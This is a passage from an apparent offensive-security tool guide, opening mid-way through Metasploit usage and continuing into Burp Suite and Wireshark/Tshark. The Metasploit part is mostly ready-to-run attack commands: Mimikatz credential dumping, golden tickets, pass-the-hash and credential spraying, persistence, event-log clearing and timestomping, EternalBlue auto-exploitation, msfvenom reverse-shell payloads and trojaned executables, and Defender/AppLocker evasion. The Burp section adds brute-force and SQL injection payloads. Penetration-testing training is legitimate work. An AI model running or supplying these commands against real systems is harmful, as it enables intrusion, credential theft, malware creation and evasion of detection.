msf6 exploit(windows/local/bypassuac_injection) > run

# Local exploit suggester
meterpreter > run post/multi/recon/local_exploit_suggester
```

**Credential Harvesting:**

```bash
# Dump hashes (requires SYSTEM)
meterpreter > hashdump

# Kiwi (Mimikatz)
meterpreter > load kiwi
meterpreter > kiwi_cmd privilege::debug
meterpreter > kiwi_cmd sekurlsa::logonpasswords
meterpreter > creds_all
meterpreter > creds_kerberos
meterpreter > creds_msv
meterpreter > creds_wdigest

# Golden ticket
meterpreter > golden_ticket_create -d domain.local -k krbtgt_hash -s domain_sid -u administrator -t /tmp/golden.ticket
```

**Network Pivoting:**

```bash
# Add route through session
meterpreter > run autoroute -s 10.10.10.0/24

# View routes
meterpreter > run autoroute -p

# Port forwarding
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.5
meterpreter > portfwd list
meterpreter > portfwd delete -l 8080

# SOCKS proxy
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
msf6 auxiliary(server/socks_proxy) > run -j
```

**Persistence:**

```bash
# Registry persistence
meterpreter > run persistence -X -i 60 -p 4445 -r 192.168.1.5

# Service persistence
meterpreter > background
msf6 > use exploit/windows/local/persistence_service
msf6 exploit(windows/local/persistence_service) > set SESSION 1
msf6 exploit(windows/local/persistence_service) > run
```

**Covering Tracks:**

```bash
# Clear event logs
meterpreter > clearev

# Timestomp
meterpreter > timestomp C:\\Windows\\Temp\\malware.exe -v
meterpreter > timestomp C:\\Windows\\Temp\\malware.exe -m "01/01/2020 12:00:00"
```

### Advanced Exploitation Techniques

**Pivoting Through Sessions:**

```bash
# Add route
msf6 > route add 10.10.10.0/24 [session_id]
msf6 > route print

# Use internal network from external session
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.10.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
msf6 auxiliary(scanner/portscan/tcp) > run

# Exploit through pivot
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.10.5
msf6 exploit(windows/smb/psexec) > set SMBUser administrator
msf6 exploit(windows/smb/psexec) > set SMBPass password
msf6 exploit(windows/smb/psexec) > exploit
```

**Credential Re-use (Pass-the-Hash):**

```bash
# Using psexec
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.10
msf6 exploit(windows/smb/psexec) > set SMBUser administrator
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
msf6 exploit(windows/smb/psexec) > exploit

# Spray credentials across multiple hosts
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS file:/root/targets.txt
msf6 auxiliary(scanner/smb/smb_login) > set SMBUser administrator
msf6 auxiliary(scanner/smb/smb_login) > set SMBPass password
msf6 auxiliary(scanner/smb/smb_login) > set THREADS 10
msf6 auxiliary(scanner/smb/smb_login) > run
```

**Session Management:**

```bash
# List sessions
msf6 > sessions -l

# Interact with session
msf6 > sessions -i [id]

# Background session
meterpreter > background
[Ctrl+Z]

# Kill session
msf6 > sessions -k [id]

# Upgrade shell to meterpreter
msf6 > sessions -u [id]

# Run command on all sessions
msf6 > sessions -c "sysinfo" -i 1,2,3

# Script all sessions
msf6 > sessions -s /path/to/script.rc
```

### Resource Scripts (.rc files)

**Creating Resource Scripts:**

```bash
# Example: auto_exploit.rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit -j -z

# Run resource script
msfconsole -r auto_exploit.rc

# Or from console
msf6 > resource /path/to/script.rc

# Record commands to script
msf6 > makerc /root/recorded_commands.rc
```

**Auto-exploitation Script:**

```bash
# auto_pwn.rc
workspace -a auto_pwn
db_import /root/nmap_scan.xml hosts -R 
use auxiliary/scanner/smb/smb_version 
set THREADS 20 
run 
use exploit/windows/smb/ms17_010_eternalblue 
services -p 445 -R 
set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 192.168.1.5 
set LPORT 4444 
exploit -z

````

**Post-Exploitation Automation:**
```bash
# post_exploit.rc
use post/windows/gather/hashdump
sessions -i 1
run
background
use post/windows/gather/enum_shares
set SESSION 1
run
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
````

### Metasploit Modules Development

**Basic Module Structure:**

```ruby
# exploits/example/my_exploit.rb
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Example Exploit',
      'Description'    => %q{
        This exploits a vulnerability in example service
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2024-1234'],
          ['URL', 'http://example.com/advisory']
        ],
      'Platform'       => 'linux',
      'Targets'        =>
        [
          ['Linux x64', { 'Arch' => ARCH_X64 }]
        ],
      'Payload'        =>
        {
          'Space'    => 1000,
          'BadChars' => "\x00\x0a\x0d"
        },
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        Opt::RPORT(9999)
      ])
  end

  def exploit
    connect
    
    payload_data = payload.encoded
    
    # Exploitation logic here
    sploit = "A" * 1024 + payload_data
    
    sock.put(sploit)
    
    handler
    disconnect
  end
end
```

**Module Location and Reload:**

```bash
# Custom modules directory
~/.msf4/modules/

# Reload all modules
msf6 > reload_all

# Reload specific module
msf6 > reload_lib /path/to/module.rb
```

### MSFVenom Advanced Usage

**Platform-Specific Payloads:**

```bash
# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -o malicious.apk

# macOS
msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f macho -o shell.macho

# Python bytecode
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw | base64

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f psh -o shell.ps1
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f psh-cmd

# Shellcode formats
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f c
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f python
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw
```

**Embedding Payloads:**

```bash
# Inject into legitimate executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/to/legit.exe -k -f exe -o trojan.exe

# Template with specific architecture
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/to/legit64.exe -k -a x64 --platform windows -f exe -o trojan64.exe
```

**Staged vs Stageless:**

```bash
# Staged (smaller initial payload, requires metasploit handler)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o staged.exe

# Stageless (fully self-contained, larger)
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o stageless.exe
```

**Encoders and Iterations:**

```bash
# List encoders
msfvenom --list encoders

# Shikata ga nai (polymorphic XOR)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

# Multiple encoders
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -e x86/alpha_upper -i 3 -f exe -o multi_encoded.exe

# Architecture-specific encoders
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x64/xor_dynamic -i 5 -f elf -o encoded.elf
```

### Metasploit Evasion Modules

```bash
# List evasion modules
msf6 > search type:evasion

# Use evasion module
msf6 > use evasion/windows/windows_defender_exe
msf6 evasion(windows/windows_defender_exe) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 evasion(windows/windows_defender_exe) > set LHOST 192.168.1.5
msf6 evasion(windows/windows_defender_exe) > set LPORT 4444
msf6 evasion(windows/windows_defender_exe) > run

# Applocker evasion
msf6 > use evasion/windows/applocker_evasion_install_util
msf6 > use evasion/windows/applocker_evasion_msbuild
msf6 > use evasion/windows/applocker_evasion_regasm_regsvcs
```

### Exploit Ranking System

Metasploit ranks exploits by reliability:

- **ExcellentRanking:** Exploit never crashes service
- **GreatRanking:** Exploit rarely crashes service
- **GoodRanking:** Exploit sometimes crashes service
- **NormalRanking:** Exploit often crashes service
- **AverageRanking:** Exploit unreliable
- **LowRanking:** Exploit nearly unusable
- **ManualRanking:** Exploit unstable/requires manual setup

```bash
# Search by rank
msf6 > search rank:excellent type:exploit
```

### Automation and Scripting

**Using MSFConsole with Commands:**

```bash
# One-liner execution
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; exploit"

# Execute multiple commands
msfconsole -q -x "workspace -a project; db_import scan.xml; hosts; exit"
```

**MSF RPC (Remote Procedure Call):**

```bash
# Start RPC server
msfrpcd -P password -U username -a 127.0.0.1

# Connect from another terminal
msf6 > load msgrpc ServerHost=127.0.0.1 ServerPort=55553 User=username Pass=password
```

**Python automation with pymetasploit3:**

```python
from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient('password', server='127.0.0.1', port=55553)

exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
exploit['RHOSTS'] = '192.168.1.10'
exploit['LHOST'] = '192.168.1.5'
exploit['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'

print(exploit.execute())
```

## Burp Suite Professional

Burp Suite is the industry-standard web application security testing platform. Professional edition provides advanced scanning, extension support, and collaboration features.

### Core Components

**Proxy:** HTTP/HTTPS intercepting proxy **Target:** Site map and scope definition **Intruder:** Automated customized attacks **Repeater:** Manual request manipulation **Scanner:** Automated vulnerability detection (Pro only) **Sequencer:** Session token randomness analysis **Decoder:** Encoding/decoding utilities **Comparer:** Visual diff tool **Extender:** Extension/plugin management

### Proxy Configuration

**Starting Burp Proxy:**

```bash
# Launch Burp Suite
burpsuite

# Or with specific java options
java -jar -Xmx4G /usr/share/burpsuite/burpsuite.jar
```

**Proxy Settings (Burp):**

- Default listener: `127.0.0.1:8080`
- Add listener: Proxy â†’ Options â†’ Proxy Listeners â†’ Add
- Invisible proxy mode: Proxy â†’ Options â†’ Request handling â†’ Support invisible proxying

**Browser Configuration:**

```bash
# Firefox proxy settings
Preferences â†’ Network Settings â†’ Manual proxy configuration
HTTP Proxy: 127.0.0.1, Port: 8080
Use this proxy for all protocols: checked

# Or use FoxyProxy extension for quick switching
```

**SSL/TLS Certificate Installation:**

1. Browse to `http://burpsuite` with proxy enabled
2. Download CA certificate (DER format)
3. Firefox: Preferences â†’ Privacy & Security â†’ Certificates â†’ View Certificates â†’ Import
4. Chrome: Settings â†’ Privacy and security â†’ Security â†’ Manage certificates â†’ Import

**Upstream Proxy Configuration:**

```bash
# Route Burp through another proxy (e.g., Tor)
Burp â†’ User options â†’ Connections â†’ Upstream Proxy Servers â†’ Add
Destination host: *
Proxy host: 127.0.0.1
Proxy port: 9050 (Tor SOCKS)
Type: SOCKS
```

### Target Scope and Site Mapping

**Defining Scope:**

```bash
Target â†’ Scope â†’ Add
Protocol: HTTP/HTTPS
Host: target.com
File: ^/.*$ (regex for all paths)

# Include only in-scope items
Target â†’ Site map â†’ Filter â†’ Show only in-scope items
Proxy â†’ Options â†’ Intercept Client Requests â†’ And URL is in target scope
```

**Spider/Crawler:**

```bash
# Manual spidering
Target â†’ Site map â†’ Right-click domain â†’ Spider this host

# Spider options
Target â†’ Site map â†’ Right-click â†’ Spider options
- Maximum link depth
- Form submission behavior
- Login functionality handling

# Forced browsing
Target â†’ Site map â†’ Right-click â†’ Discover content
- Use wordlists from /usr/share/wordlists/
```

**Content Discovery:**

```bash
Target â†’ Site map â†’ Right-click target â†’ Engagement tools â†’ Discover content
- Filename wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt
- File extension list: php,asp,aspx,jsp,html,txt,bak
```

### Intruder - Automated Attacks

**Attack Types:**

**Sniper:** Single payload set, iterates through positions one at a time

```
Example positions: username=Â§adminÂ§&password=Â§passÂ§
Tests: admin/pass1, admin/pass2, user1/pass, user2/pass
```

**Battering Ram:** Single payload set, same value in all positions simultaneously

```
Example: username=Â§adminÂ§&password=Â§adminÂ§
Tests: admin/admin, test/test, user/user
```

**Pitchfork:** Multiple payload sets, parallel iteration

```
Example: username=Â§adminÂ§&password=Â§pass123Â§
Payload set 1: admin, user, test
Payload set 2: pass1, pass2, pass3
Tests: admin/pass1, user/pass2, test/pass3
```

**Cluster Bomb:** Multiple payload sets, all combinations

```
Example: username=Â§adminÂ§&password=Â§passÂ§
Payload set 1: admin, user
Payload set 2: pass1, pass2
Tests: admin/pass1, admin/pass2, user/pass1, user/pass2
```

**Setting Up Attacks:**

```bash
# 1. Send request to Intruder
Proxy/Repeater â†’ Right-click request â†’ Send to Intruder

# 2. Configure positions
Intruder â†’ Positions
- Clear all positions (Clear Â§)
- Select text to fuzz â†’ Add Â§ (Add Â§)

# 3. Configure payloads
Intruder â†’ Payloads
- Payload set: Select position number
- Payload type: Simple list, Runtime file, Numbers, etc.
- Payload options: Add items manually or load from file

# 4. Configure options
Intruder â†’ Options
- Request Engine: Thread count (Pro: 30+, Community: 1)
- Grep - Match: Extract specific strings from responses
- Grep - Extract: Capture data with regex
- Redirections: Follow redirects settings

# 5. Start attack
Intruder â†’ Target â†’ Start attack
```

**Practical Intruder Examples:**

**Username Enumeration:**

```bash
# Position: username parameter
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=Â§adminÂ§&password=test

# Payload: /usr/share/seclists/Usernames/top-usernames-shortlist.txt
# Filter results by response length/status code differences
```

**Password Brute Force:**

```bash
# Pitchfork attack
POST /login HTTP/1.1
Host: target.com

username=Â§adminÂ§&password=Â§passÂ§

# Payload set 1: Known usernames
# Payload set 2: /usr/share/wordlists/rockyou.txt
# Grep - Match: "Login successful" or "Welcome"
```

**SQL Injection Detection:**

```bash
# Position: vulnerable parameter
GET /product?id=Â§1Â§ HTTP/1.1

# Payload type: Runtime file
# Payload: /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
# Grep - Match: "SQL", "error", "mysql", "syntax"
```

**IDOR Testing:**

```bash
# Position: ID parameter
GET /api/user/Â§123Â§/profile HTTP/1.1

# Payload type: Numbers
# From: 1, To: 1000, Step: 1
# Filter by 200 responses, check for unauthorized data access
```

### Repeater - Manual Testing

```bash
# Send request to Repeater
Proxy/Intruder â†’ Right-click â†’ Send to Repeater

# Modify and resend requests
Repeater â†’ Edit request â†’ Send
- View raw/hex/rendered response
- Compare responses (Right-click â†’ Compare)

# Useful for:
- Manual parameter manipulation
- Authentication bypass testing
- Header manipulation
- Request method changes (GETâ†’POST, etc.)
```

**Repeater Workflows:**

**Testing Authentication Bypass:**

```http
# Original request
POST /admin HTTP/1.1
Cookie: session=abc123

# Test 1: Remove cookie
POST /admin HTTP/1.1

# Test 2: Modify cookie
POST /admin HTTP/1.1
Cookie: session=abc123; admin=true

# Test 3: Add custom headers
POST /admin HTTP/1.1
Cookie: session=abc123
X-Original-URL: /admin
X-Forwarded-For: 127.0.0.1
```

**SQL Injection Verification:**

```http
GET /search?q=testÂ§' OR '1'='1Â§ HTTP/1.1

# Test various payloads systematically:
# Basic: ' OR '1'='1
# Union: ' UNION SELECT NULL--
# Blind: ' AND SLEEP(5)--
# Error-based: ' AND 1=CONVERT(int,(SELECT @@version))--
```

### Scanner (Professional Only)

**Active Scanning:**

```bash
# Right-click target/request
Target/Proxy â†’ Right-click â†’ Scan

# Scan configuration
- Crawl and audit
- Audit only (requires existing site map)
- Crawl only

# Scan options
Scanner â†’ Options â†’ Active Scanning
- Scan speed: Fast/Normal/Thorough
- Scan accuracy: Normal/Minimizes false positives/Minimizes false negatives
```

**Scan Configurations:**

```bash
# Pre-configured scans
Scanner â†’ New scan â†’ Scan configuration
- Crawl strategy
- Audit checks (SQLi, XSS, XXE, etc.)
- Insertion points
- False positive reduction

# Custom scan configuration
Scanner â†’ Scan configurations â†’ New
- Select specific vulnerability classes
- Configure thoroughness per check
```

**Vulnerability Analysis:**

```bash
# View scan results
Target â†’ Site map â†’ Issues
Dashboard â†’ Issue activity

# Issue details
- Severity: High/Medium/Low/Information
- Confidence: Certain/Firm/Tentative
- Description and remediation
- Request/Response evidence

# Export findings
Target â†’ Right-click â†’ Report selected issues
- HTML, XML, or custom formats
```

**Scan Insertion Points:**

```bash
Scanner â†’ Options â†’ Active Scanning â†’ Insertion point types
- URL parameter values
- Body parameter values
- Cookie values
- Parameter name
- HTTP headers
- URL path filename
- URL path folders
- Entire body (XML/JSON)
```

### Sequencer - Session Token Analysis

**Analyzing Token Randomness:**

```bash
# Capture tokens
Proxy â†’ Right-click request generating tokens â†’ Send to Sequencer

# Configure token location
Sequencer â†’ Select location â†’ Cookie: session=
OR
Sequencer â†’ Define custom location

# Start live capture
Sequencer â†’ Start live capture
- Capture at least 100 tokens (20,000+ recommended for accuracy)
- Monitor token generation rate

# Analyze results
Sequencer â†’ Analyze now
- Overall quality: Excellent/Good/Poor
- Effective entropy estimate
- Character-level analysis
- Bit-level analysis
```

**Token Generation Testing:**

```http
# Example: Session cookie analysis
GET /login HTTP/1.1
Host: target.com

Response:
Set-Cookie: PHPSESSID=a3f8h2k9d1m5; path=/

# Capture multiple samples
PHPSESSID=a3f8h2k9d1m5
PHPSESSID=b4g9i3l0e2n6
PHPSESSID=c5h0j4m1f3o7
...

# Sequencer detects patterns/predictability
```

### Decoder

**Encoding/Decoding Operations:**

```bash
Decoder â†’ Paste data â†’ Encode/Decode as:
- URL encoding
- HTML encoding
- Base64
- ASCII hex
- Octal
- Binary
- Gzip
- Hash: MD5, SHA-1, SHA-256
```

**Smart Decode:**

```bash
# Automatic detection and decoding
Decoder â†’ Smart decode
- Automatically tries various encodings
- Useful for nested encoding
```

**Example Workflow:**

```bash
# Encoded JWT token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature

# Decode each section (Base64)
1. Decoder â†’ Paste header â†’ Decode as Base64
2. Result: {"alg":"HS256","typ":"JWT"}
3. Repeat for payload section
```

### Comparer

**Visual Diff Tool:**

```bash
# Compare two requests/responses
Right-click item â†’ Send to Comparer (request/response)

# Compare
Comparer â†’ Select two items â†’ Words/Bytes comparison
- Highlights differences
- Useful for:
  - Blind SQL injection timing differences
  - Session token analysis
  - Authentication bypass verification
  - Before/after comparison
```

### Extensions (Extender)

**Installing Extensions:**

```bash
Extender â†’ BApp Store â†’ Select extension â†’ Install

# Manual installation
Extender â†’ Extensions â†’ Add
- Extension type: Java/Python/Ruby
- Extension file: .jar, .py, .rb
```

**Essential Extensions:**

**Autorize:** Authorization testing

```bash
# Tests authorization for each request with different user sessions
- Configure low-privilege user session
- Browse as high-privilege user
- Autorize replays requests with low-priv session
- Flags authorization issues
```

**Logger++:** Advanced logging

```bash
# Enhanced logging with filtering
- Regex filtering
- Colorization
- Export to CSV
- Useful for tracking specific parameters/responses
```

**Turbo Intruder:** High-speed fuzzing

```bash
# Python-based custom fuzzing
- Much faster than built-in Intruder
- Custom Python scripts for attack logic
- HTTP/2 support

# Example usage
Send to Turbo Intruder â†’ Select template â†’ Modify script
```

**Param Miner:** Parameter discovery

```bash
# Discovers hidden parameters
Right-click request â†’ Extensions â†’ Param Miner â†’ Guess parameters
- GET parameters
- POST parameters
- Headers
- Cookies
```

**JSON Web Tokens (JWT) Extensions:**

```bash
# JWT Editor
- Decode/encode JWT
- Generate signing keys
- Test algorithm confusion
- Inject custom claims
```

**ActiveScan++:** Additional scan checks

```bash
# Adds extra vulnerability checks
- Host header injection
- HTTP/2 smuggling
- Edge side includes
- Template injection
```

**Collaborator Everywhere:** SSRF/OOB testing

```bash
# Automatically injects Collaborator payloads
- Detects blind SSRF
- Out-of-band injection points
- DNS/HTTP callbacks
```

### Advanced Features

**Session Handling Rules:**

```bash
Project options â†’ Sessions â†’ Session Handling Rules â†’ Add

# Use cases:
- Automatic re-authentication
- CSRF token refresh
- Multi-step authentication
- Session validation

# Example: CSRF token refresh
1. If request has CSRF parameter
2. Run macro to get fresh token
3. Update current request with new token
```

**Macros:**

```bash
Project options â†’ Sessions â†’ Macros â†’ Add

# Record sequence of requests
- Login sequence
- Token generation
- Multi-step processes

# Use in session handling rules
```

**Match and Replace:**

```bash
Proxy â†’ Options â†’ Match and Replace â†’ Add

# Automatic request/response modification
Type: Request header
Match: User-Agent: .*
Replace: User-Agent: CustomUA

# Use cases:
- Header injection
- Parameter manipulation
- Response modification for testing
```

**Project Files:**

```bash
# Save project state
Burp â†’ Project â†’ Save project

# Project options vs User options
- Project options: Specific to current project (scope, sessions)
- User options: Global settings (proxy, display)

# Export/Import settings
Burp â†’ Settings â†’ Load/Save configuration
```

### Burp Collaborator

**Out-of-Band Interaction Detection:**

```bash
# Built-in Collaborator server (Pro only)
Burp Collaborator client â†’ Generate payload

# Manual polling
Burp Collaborator client â†’ Poll now

# Use cases:
- Blind SSRF detection
- XXE exfiltration
- Blind command injection
- Blind SQL injection (DNS)
```

**Custom Collaborator Server:**

```bash
# Run private Collaborator (requires domain and SSL)
java -jar burp.jar --collaborator-server --collaborator-config=config.properties

# config.properties example:
serverDomain=collab.yourdomain.com
eventCapture.https.port=443
eventCapture.http.port=80
```

### Burp Suite Professional CLI

**Headless Scanning:**

```bash
# Run scan from command line
java -jar -Xmx4G burpsuite_pro.jar --project-file=project.burp --unpause-spider-and-scanner

# Generate scan report
java -jar burpsuite_pro.jar --project-file=project.burp --report-output=report.html --report-type=HTML
```

### Performance Optimization

```bash
# Increase Java heap size
java -jar -Xmx8G /usr/share/burpsuite/burpsuite.jar

# Disable unnecessary features during scanning
Target â†’ Site map â†’ Show only in-scope items
Proxy â†’ Options â†’ Intercept Client Requests â†’ (disable during passive scanning)

# Limit active scan thread count (for stability)
Scanner â†’ Options â†’ Active Scanning â†’ Number of threads: 10-30

# Database optimization (large projects)
Project options â†’ Misc â†’ Temporary files location â†’ Use disk-based storage
```

## Wireshark/Tshark

Wireshark is the industry-standard network protocol analyzer. Tshark provides command-line packet capture and analysis capabilities.

### Wireshark GUI Essentials

**Starting Capture:**

```bash
# Launch Wireshark
sudo wireshark

# Select interface
Capture â†’ Options â†’ Select interface (eth0, wlan0, etc.)
- Promiscuous mode: Capture all packets on network segment
- Monitor mode (wireless): Capture all wireless traffic

# Start capture
Capture â†’ Start (or Ctrl+E)

# Capture filters (applied before capture)
Capture â†’ Options â†’ Capture filter
```

**Capture Filters (BPF Syntax):**

```bash
# Host filtering
host 192.168.1.10
src host 192.168.1.10
dst host 192.168.1.10

# Network filtering
net 192.168.1.0/24
src net 10.0.0.0/8

# Port filtering
port 80
port 80 or port 443
portrange 1-1024

# Protocol filtering
tcp
udp
icmp
arp

# Combined filters
tcp and port 80
host 192.168.1.10 and (port 80 or port 443)
tcp and src host 192.168.1.10 and dst port 443

# Exclude traffic
not port 22
not host 192.168.1.1

# Capture only SYN packets
tcp[tcpflags] & tcp-syn != 0

# Capture only packets with data
tcp[((tcp[12:1] & 0xf0) >> 2):4] != 0
```

**Display Filters (Applied After Capture):**

```bash
# IP filtering
ip.addr == 192.168.1.10
ip.src == 192.168.1.10
ip.dst == 192.168.1.10

# TCP/UDP port filtering
tcp.port == 80
tcp.srcport == 443
tcp.dstport == 3389
udp.port == 53

# Protocol filtering
http
dns
ssh
smb
smb2

# HTTP-specific
http.request.method == "POST"
http.request.uri contains "admin"
http.response.code == 200
http.cookie contains "session"
http.user_agent contains "sqlmap"

# DNS queries
dns.qry.name contains "evil.com"
dns.qry.type == 1  # A records
dns.qry.type == 28  # AAAA records

# TCP flags
tcp.flags.syn == 1
tcp.flags.reset == 1
tcp.flags.push == 1
tcp.flags.fin == 1

# String searching
frame contains "password"
tcp contains "admin"
http.request.uri contains "../../"

# Logical operators
http and ip.addr == 192.168.1.10
tcp.port == 80 or tcp.port == 443
!(arp or icmp or dns)

# Follow TCP stream
tcp.stream eq 0
tcp.stream eq 5

# Time-based filtering
frame.time >= "2024-01-15 10:00:00"
frame.time_delta > 1  # Packets with >1s delay
```

**Following Streams:**

```bash
# Right-click packet â†’ Follow â†’ TCP/UDP/HTTP/TLS Stream
- View entire conversation
- Filter: tcp.stream eq N
- Show data as: ASCII, EBCDIC, Hex Dump, C Arrays, Raw

# Extract stream data
Follow Stream â†’ Save as â†’ Raw data
```

**Packet Details Inspection:**

```bash
# Packet layers (bottom-up)
Frame â†’ Ethernet â†’ IP â†’ TCP/UDP â†’ Application Protocol

# Expand sections
Click ">" to expand protocol details

# Right-click field â†’ Apply as Filter
- Selected
- Not Selected
- ... and Selected
- ... or Selected
```

**Statistics and Analysis:**

```bash
# Protocol hierarchy
Statistics â†’ Protocol Hierarchy
- Shows distribution of protocols
- Percentage of traffic per protocol

# Conversations
Statistics â†’ Conversations
- TCP/UDP/IP conversations
- Bytes transferred per conversation
- Sort by packets/bytes

# Endpoints
Statistics â†’ Endpoints
- Traffic per IP/MAC address
- Transmission statistics

# IO Graphs
Statistics â†’ I/O Graph
- Visual traffic patterns over time
- Filter-specific graphs
- Y-axis: Packets/Bytes/Bits/Advanced

# HTTP statistics
Statistics â†’ HTTP â†’ Requests
Statistics â†’ HTTP â†’ Load Distribution
Statistics â†’ HTTP â†’ Packet Counter
Statistics â†’ HTTP â†’ Request Sequences
```

**Exporting Objects:**

```bash
# Export HTTP objects
File â†’ Export Objects â†’ HTTP
- Lists all HTTP objects (images, files, etc.)
- Save individual or all objects

# Export other protocols
File â†’ Export Objects â†’ SMB/TFTP/FTP/DICOM
```

**Coloring Rules:**

```bash
View â†’ Coloring Rules

# Default colors
- Green: TCP conversation
- Light blue: UDP conversation
- Black: TCP errors
- Red: Problems/errors
- Yellow: HTTP

# Add custom coloring
Coloring Rules â†’ Add
Name: Suspicious Traffic
Filter: http.request.uri contains "cmd"
Foreground: Red
```

### Tshark Command-Line Analysis

**Basic Capture:**

```bash
# List interfaces
tshark -D

# Capture on specific interface
sudo tshark -i eth0

# Capture to file
sudo tshark -i eth0 -w capture.pcap

# Capture N packets
sudo tshark -i eth0 -c 100

# Capture for duration (seconds)
sudo tshark -i eth0 -a duration:60

# Capture with file size limit
sudo tshark -i eth0 -a filesize:100000  # 100MB
```

**Reading Capture Files:**

```bash
# Read pcap file
tshark -r capture.pcap

# Read with display filter
tshark -r capture.pcap -Y "http"
tshark -r capture.pcap -Y "ip.src==192.168.1.10"

# Read specific number of packets
tshark -r capture.pcap -c 50
```

**Display Filters in Tshark:**

```bash
# HTTP requests
tshark -r capture.pcap -Y "http.request"

# HTTP POST requests
tshark -r capture.pcap -Y "http.request.method==POST"

# DNS queries for specific domain
tshark -r capture.pcap -Y "dns.qry.name contains evil.com"

# TCP SYN packets
tshark -r capture.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0"

# Packets with specific string
tshark -r capture.pcap -Y "frame contains password"

# TLS handshakes
tshark -r capture.pcap -Y "tls.handshake"
```

**Output Formatting:**

```bash
# Verbose output (packet details)
tshark -r capture.pcap -V

# One-line summary
tshark -r capture.pcap -T fields -e frame.number -e ip.src -e ip.dst -e tcp.port

# Custom fields

tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e http.request.uri

# CSV output

tshark -r capture.pcap -T fields -E header=y -E separator=, -e ip.src -e ip.dst -e tcp.port

# JSON output

tshark -r capture.pcap -T json

# PDML (Packet Details Markup Language)

tshark -r capture.pcap -T pdml

# PS (PostScript) for printing

tshark -r capture.pcap -T ps
````

**Field Extraction:**
```bash
# Extract specific HTTP fields
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri -e http.user_agent

# Extract DNS queries and responses
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name -e dns.resp.addr

# Extract credentials from FTP
tshark -r capture.pcap -Y "ftp.request.command==USER or ftp.request.command==PASS" -T fields -e ftp.request.arg

# Extract cookies
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie

# Extract file transfers
tshark -r capture.pcap -Y "http.response" -T fields -e http.content_type -e http.content_length

# Extract SMB filenames
tshark -r capture.pcap -Y "smb2.filename" -T fields -e smb2.filename
````

**Statistics and Analysis:**

```bash
# Protocol hierarchy
tshark -r capture.pcap -q -z io,phs

# Conversation statistics
tshark -r capture.pcap -q -z conv,tcp
tshark -r capture.pcap -q -z conv,udp
tshark -r capture.pcap -q -z conv,ip

# Endpoint statistics
tshark -r capture.pcap -q -z endpoints,tcp
tshark -r capture.pcap -q -z endpoints,ip

# HTTP statistics
tshark -r capture.pcap -q -z http,tree
tshark -r capture.pcap -q -z http_req,tree
tshark -r capture.pcap -q -z http_srv,tree

# DNS statistics
tshark -r capture.pcap -q -z dns,tree

# Expert info (errors/warnings)
tshark -r capture.pcap -q -z expert

# IO statistics (traffic rate over time)
tshark -r capture.pcap -q -z io,stat,1  # 1-second intervals
tshark -r capture.pcap -q -z io,stat,1,"COUNT(tcp.port)tcp.port==80"

# Follow TCP stream (by stream number)
tshark -r capture.pcap -q -z follow,tcp,ascii,0

# Service Response Time
tshark -r capture.pcap -q -z smb,srt
